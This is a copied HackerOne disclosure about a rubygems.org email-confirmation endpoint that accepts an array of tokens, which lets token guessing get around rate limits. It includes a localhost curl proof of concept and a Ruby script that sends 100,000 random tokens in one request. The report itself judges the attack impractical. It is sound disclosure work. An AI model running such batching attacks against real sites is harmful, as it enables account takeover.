## Original Report

The following is copied from hackerone's report.  https://hackerone.com/reports/1529183

---

I confirmed that EmailConfirmationsController has the same problem as https://hackerone.com/reports/449356 .

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L55

```ruby
  def validate_confirmation_token
    @user = User.find_by(confirmation_token: params[:token])
    redirect_to root_path, alert: t("failure_when_forbidden") unless @user&.valid_confirmation_token?
  end
```

Using an array in `params[:token]` makes searching for `confirmation_token` more efficient.

### PoC

1. start server in local
2. Access url with multiple token

```
❯ curl --globoff 'http://127.0.0.1:3000/email_confirmations/confirm?token[]=key1&token[]=key2'

<html><body>You are being <a href="http://127.0.0.1:3000/">redirected</a>.</body></html>%
```

#### rails log

```ruby

```

### batching attack

```ruby
require 'net/http'
require 'securerandom'
require 'json'

# https://github.com/thoughtbot/clearance/blob/main/lib/clearance/token.rb
keys = 100_000.times.map{SecureRandom.hex(20).encode('UTF-8')}

uri = URI.parse("http://127.0.0.1:3000/email_confirmations/confirm")
http = Net::HTTP.new(uri.host, uri.port)
req = Net::HTTP::Get.new(uri.path)
req["Content-Type"] = "application/json"
req.body = {token: keys}.to_json

res = http.request(req)
puts res.body
```

In the previous report, 65534 was the limit, but due to a change in the behavior of rails, it is possible to send more numbers.

## Impact

There is a rate limit for accessing websites, but this method allows attacker to confirm a large number of tokens.

https://guides.rubygems.org/rubygems-org-rate-limits/
> API and website: 10 requests per second

If authentication by `validate_confirmation_token` is successful, users who have a valid confirm_token and have not set up multi-factor authentication will be able to sign in.

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L5

```ruby
  def update
    if @user.mfa_enabled?
      @form_url = mfa_update_email_confirmations_url(token: @user.confirmation_token)
      render template: "multifactor_auths/otp_prompt"
    else
      confirm_email_success
    end
  end
```  

https://github.com/rubygems/rubygems.org/blob/962dba88995c98973f52fa84faebce4a62cd56e3/app/controllers/email_confirmations_controller.rb#L62

```ruby
  def confirm_email_success
    @user.confirm_email!
    sign_in @user
    redirect_to root_path, notice: t("email_confirmations.update.confirmed_email")
  end
```

I confirmed the number of tokens that can be sent in one request, it seems to be around 2 million.

The value of `client_max_body_size` of nginx setting in rubygems.org is `500M`, and it seems that attacker can send up to about 12 million tokens when sending using json. https://github.com/rubygems/rubygems.org/blob/master/config/deploy/nginx-configmap.yaml.erb#L79
However, when I confirmed the operation locally, sending more than 2 million tokens made it easier for unexplained postgresql errors to occur.

```

Calculated, the time required for one IP address brute force is 1915427376 years.

```
16 ** 20 / (2_000_000 * 10) / 3600 / 24 / 365.25
=> 1915427376.6297057
```

Considering that a valid confirm_token exists for each user and that it is sent from multiple IPs using botnet, etc., it is likely to be a few more digits lower.

However, since the confirm_token has an expiration time of 3 hours, it would have been safe enough.
